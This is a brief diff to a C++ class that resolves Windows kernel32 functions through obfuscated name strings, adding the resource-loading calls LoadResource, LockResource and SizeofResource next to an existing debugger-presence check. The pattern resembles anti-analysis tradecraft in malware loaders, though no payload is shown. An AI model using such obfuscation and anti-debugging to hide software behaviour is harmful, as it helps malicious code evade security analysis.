@@ -23,6 +23,9 @@ RunImp::RunImp() {
     this->dCheckRemoteDebuggerPresent = resolver._kernel32[OBFUSCATE("CheckRemoteDebuggerPresent")];
     this->dGetCurrentProcess = resolver._kernel32[OBFUSCATE("GetCurrentProcess")];
     this->dGetVolumeInformationA = resolver._kernel32[OBFUSCATE("GetVolumeInformationA")];
+    this->dLoadResource = resolver._kernel32[OBFUSCATE("LoadResource")];
+    this->dLockResource = resolver._kernel32[OBFUSCATE("LockResource")];
+    this->dSizeofResource = resolver._kernel32[OBFUSCATE("SizeofResource")];
 }
 
 RunImp* RunImp::GetInstance() {
